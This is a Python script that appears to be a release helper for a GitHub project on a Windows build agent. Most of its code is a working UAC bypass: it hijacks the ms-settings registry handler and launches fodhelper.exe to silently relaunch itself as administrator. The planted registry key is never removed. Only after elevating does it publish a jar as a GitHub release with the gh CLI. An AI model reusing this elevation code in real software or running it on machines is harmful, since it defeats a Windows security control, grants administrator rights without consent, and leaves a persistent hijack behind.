
from __future__ import print_function
import os
import sys
import re
import ctypes
if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg
    
CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "C:\Users\TeamCity\AppData\Local\Programs\Python\Python38\python.exe"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
        
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
        
def execute():        
    if not is_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:                
            current_dir = __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        files = [file for file in os.listdir(os.path.join(os.getcwd(), "build", "libs")) if re.match('[\s\S]+-[0-9]+\.[0-9]+\.[0-9]+.jar', file)]

    if len(files) > 0:
        file = files[-1]
        tag = file.split("-")[1][:-4]
        os.popen('gh release create {a} --title "{a}" --notes "" -R Dubhe-Studio/Talisman'.format(a=tag))
        os.popen("gh release upload {} build/libs/{} -R Dubhe-Studio/Talisman".format(tag, file))
        print('[+] The script is running with administrative privileges!')  
        
if __name__ == '__main__':
    execute()
